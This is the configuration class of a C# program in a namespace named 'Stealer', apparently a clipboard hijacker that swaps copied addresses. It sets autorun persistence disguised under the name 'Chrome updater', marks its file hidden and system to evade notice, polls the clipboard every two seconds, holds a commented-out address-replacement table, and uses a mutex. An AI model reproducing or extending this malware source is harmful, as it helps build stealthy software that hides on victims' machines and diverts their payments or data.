using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Stealer
{
    internal sealed class config
    {
        // Autorun
        public static bool autorun_enabled = true;
        public static string autorun_name = "Chrome updater";
        // Set 'hidden' attribute
        public static bool attribute_hidden = true;
        // Set 'system' attribute
        public static bool attribute_system = true;
        // Clipboard check delay in seconds
        public static int clipboard_check_delay = 2;
        // Replace to
        //public static Dictionary<string, string> addresses = new Dictionary<string, string>()
        //{
        //
        //}

        // Mutex (random)
        public static string mutex = "asuhdvaystdvytasdvtyasvdfctyasd";
    }
}
